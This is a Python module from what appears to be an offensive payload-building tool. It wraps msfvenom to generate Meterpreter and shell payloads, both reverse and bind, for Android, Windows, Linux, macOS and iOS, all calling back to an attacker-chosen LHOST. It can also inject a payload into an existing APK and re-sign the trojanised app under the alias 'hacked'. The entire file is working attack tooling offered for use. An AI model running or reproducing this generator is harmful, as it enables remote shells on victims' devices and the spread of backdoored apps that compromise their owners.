# Developer: Sreeraj
# GitHub: https://github.com/s-r-e-e-r-a-j

from typing import Optional, List
from .utils import run_cmd, info, ok, fail
import os

MAP = {
    'android_tcp': 'android/meterpreter/reverse_tcp',
    'android_http': 'android/meterpreter/reverse_http',
    'android_https': 'android/meterpreter/reverse_https',
    'windows_reverse_tcp': 'windows/meterpreter/reverse_tcp',
    'windows_reverse_https': 'windows/meterpreter/reverse_https',
    'windows_bind_tcp': 'windows/meterpreter/bind_tcp',
    'windows_shell_reverse_tcp': 'windows/shell/reverse_tcp',
    'windows_shell_bind_tcp': 'windows/shell/bind_tcp', 
    'linux_x86_meterpreter_reverse_http': 'linux/x86/meterpreter_reverse_http',
    'linux_x86_meterpreter_reverse_https': 'linux/x86/meterpreter_reverse_https',
    'linux_x86_meterpreter_reverse_tcp': 'linux/x86/meterpreter/reverse_tcp',
    'linux_x64_meterpreter_reverse_http': 'linux/x64/meterpreter_reverse_http',
    'linux_x64_meterpreter_reverse_https': 'linux/x64/meterpreter_reverse_https',
    'linux_x64_meterpreter_reverse_tcp': 'linux/x64/meterpreter/reverse_tcp',
    'linux_x86_shell_reverse_tcp': 'linux/x86/shell/reverse_tcp',
    'linux_x64_shell_bind_tcp': 'linux/x64/shell/bind_tcp',
    'linux_x86_meterpreter_bind_tcp': 'linux/x86/meterpreter/bind_tcp',
    'linux_x64_meterpreter_bind_tcp': 'linux/x64/meterpreter/bind_tcp',
    'linux_x86_shell_bind_tcp': 'linux/x86/shell/bind_tcp',
    'linux_x64_shell_reverse_tcp': 'linux/x64/shell/reverse_tcp',
    'macos_x86_shell_reverse_tcp': 'osx/x86/shell_reverse_tcp',
    'macos_x86_shell_bind_tcp': 'osx/x86/shell_bind_tcp',
    'macos_x64_meterpreter_bind_tcp': 'osx/x64/meterpreter/bind_tcp',
    'macos_x64_meterpreter_reverse_tcp': 'osx/x64/meterpreter/reverse_tcp',
    'macos_x64_meterpreter_reverse_http': 'osx/x64/meterpreter_reverse_http',
    'macos_x64_meterpreter_reverse_https': 'osx/x64/meterpreter_reverse_https',
    'ios_aarch64_meterpreter_reverse_http': 'apple_ios/aarch64/meterpreter_reverse_http',
    'ios_aarch64_meterpreter_reverse_https': 'apple_ios/aarch64/meterpreter_reverse_https',
    'ios_aarch64_meterpreter_reverse_tcp': 'apple_ios/aarch64/meterpreter_reverse_tcp',
    'ios_aarch64_shell_reverse_tcp': 'apple_ios/aarch64/shell_reverse_tcp',
    'ios_armle_meterpreter_reverse_http': 'apple_ios/armle/meterpreter_reverse_http',
    'ios_armle_meterpreter_reverse_https': 'apple_ios/armle/meterpreter_reverse_https',
    'ios_armle_meterpreter_reverse_tcp': 'apple_ios/armle/meterpreter_reverse_tcp'
}

FMT = {
    'android_tcp': None,
    'android_http': None,
    'android_https': None,
    'windows_reverse_tcp': 'exe',
    'windows_reverse_https': 'exe',
    'windows_bind_tcp': 'exe',
    'windows_shell_reverse_tcp': 'exe',
    'windows_shell_bind_tcp': 'exe',
    'linux_x86_meterpreter_reverse_http': 'elf',
    'linux_x86_meterpreter_reverse_https': 'elf',
    'linux_x86_meterpreter_reverse_tcp': 'elf',
    'linux_x64_meterpreter_reverse_http': 'elf',
    'linux_x64_meterpreter_reverse_https': 'elf',
    'linux_x64_meterpreter_reverse_tcp': 'elf',
    'linux_x86_shell_reverse_tcp': 'elf',
    'linux_x64_shell_bind_tcp': 'elf',
    'linux_x86_meterpreter_bind_tcp': 'elf',
    'linux_x64_meterpreter_bind_tcp': 'elf',
    'linux_x86_shell_bind_tcp': 'elf',
    'linux_x64_shell_reverse_tcp': 'elf',
    'macos_x86_shell_reverse_tcp': 'macho',
    'macos_x86_shell_bind_tcp': 'macho',
    'macos_x64_meterpreter_bind_tcp': 'macho',
    'macos_x64_meterpreter_reverse_tcp': 'macho',
    'macos_x64_meterpreter_reverse_http': 'macho',
    'macos_x64_meterpreter_reverse_https': 'macho',
    'ios_aarch64_meterpreter_reverse_http': 'macho',
    'ios_aarch64_meterpreter_reverse_https': 'macho',
    'ios_aarch64_meterpreter_reverse_tcp': 'macho',
    'ios_aarch64_shell_reverse_tcp': 'macho',
    'ios_armle_meterpreter_reverse_http': 'macho',
    'ios_armle_meterpreter_reverse_https': 'macho',
    'ios_armle_meterpreter_reverse_tcp': 'macho'
}


def build_cmd(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None) -> List[str]:
    payload = MAP.get(key)
    if not payload:
        raise ValueError('unknown payload')
    cmd: List[str] = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}']
    if infile and key.startswith('android'):
        cmd += ['-x', infile]
    fmt = FMT.get(key)
    if fmt:
        cmd += ['-f', fmt]
    cmd += ['-o', out]
    return cmd


def generate(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, dry: bool = False) -> bool:
    cmd = build_cmd(key, lhost, lport, out, infile)
    info(' '.join(cmd))
    if dry:
        info('dry run - not executing')
        return True
    rc = run_cmd(cmd)
    if rc == 0 and os.path.exists(out):
        ok(f'generated: {out}')
        return True
    fail('msfvenom failed or output missing')
    return False


def android_sign(apk: str, final: str) -> bool:
    keystore = 'ghostbuilder.keystore'
    gen = ['keytool', '-genkey', '-v', '-keystore', keystore, '-alias', 'hacked', '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000']
    rc = run_cmd(gen)
    if rc != 0:
        fail('keytool failed')
        return False
    sign = ['jarsigner', '-verbose', '-sigalg', 'SHA1withRSA', '-digestalg', 'SHA1', '-keystore', keystore, apk, 'hacked']
    rc = run_cmd(sign)
    if rc != 0:
        fail('jarsigner failed')
        return False
    verify = ['jarsigner', '-verify', '-verbose', '-certs', apk]
    run_cmd(verify)
    align = ['zipalign', '-v', '4', apk, final]
    rc = run_cmd(align)
    if rc != 0:
        fail('zipalign failed')
        return False
    run_cmd(['rm', '-f', keystore])
    ok(f'signed: {final}')
    return True
